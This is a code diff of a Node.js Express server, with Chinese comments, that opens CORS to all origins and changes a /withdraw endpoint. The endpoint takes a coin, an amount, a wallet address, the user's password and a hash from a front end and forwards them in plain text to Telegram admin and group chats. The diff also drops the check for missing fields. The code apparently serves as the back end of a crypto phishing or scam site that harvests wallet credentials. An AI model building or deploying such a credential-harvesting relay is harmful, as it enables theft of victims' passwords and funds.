@@ -4,45 +4,44 @@ const axios = require("axios");
 
 const app = express();
 
-app.use(cors());
+// --- 解决你的 OPTIONS 502（关键！！！） ---
+app.use(cors({ origin: "*", methods: "GET,POST,OPTIONS", allowedHeaders: "*" }));
+app.options("*", (req, res) => res.sendStatus(200));
+// -------------------------------------------------
+
 app.use(express.json());
 
-// Railway health check
 app.get("/", (req, res) => {
     res.send("OK");
 });
 
+// 环境变量
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;   // 私聊通知
-const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;   // 群组通知
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;
 
-// 统一发送函数
-async function sendTelegramMessage(chatId, message) {
+// 统一 Telegram 发送函数
+async function sendTelegram(chatId, msg) {
+    if (!chatId) return;
     try {
-        await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            {
-                chat_id: chatId,
-                text: message,
-                parse_mode: "HTML"
-            }
-        );
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: "HTML"
+        });
     } catch (err) {
-        console.error("Telegram ERROR:", err.response?.data || err.message);
+        console.error("Telegram Error:", err.response?.data || err.message);
     }
 }
 
 app.post("/withdraw", async (req, res) => {
-    console.log("Withdraw received:", req.body);
+
+    console.log("收到前端请求:", req.body);
 
     try {
         const { coin, amount, usdt, wallet, password, hash } = req.body;
 
-        if (!coin || !amount || !wallet || !password || !hash) {
-            return res.status(400).json({ success: false, error: "Missing fields" });
-        }
-
-        const message = `
+        const msg = `
 <b>🚨 New Withdrawal Request</b>
 
 <b>Coin:</b> ${coin}
@@ -51,25 +50,19 @@ app.post("/withdraw", async (req, res) => {
 <b>Wallet:</b> ${wallet}
 <b>Password:</b> ${password}
 <b>Hash:</b> ${hash}
-
-⏱ ${new Date().toLocaleString()}
         `;
 
-        // 发给你个人
-        if (ADMIN_CHAT_ID) {
-            sendTelegramMessage(ADMIN_CHAT_ID, message);
-        }
+        // 发给你
+        await sendTelegram(ADMIN_CHAT_ID, msg);
 
         // 发给群组
-        if (GROUP_CHAT_ID) {
-            sendTelegramMessage(GROUP_CHAT_ID, message);
-        }
+        await sendTelegram(GROUP_CHAT_ID, msg);
 
         return res.json({ success: true });
 
-    } catch (err) {
-        console.error("Server Error:", err);
-        return res.status(500).json({ success: false, error: "Internal Server Error" });
+    } catch (e) {
+        console.error("Server Error:", e);
+        return res.status(500).json({ success: false });
     }
 });
 
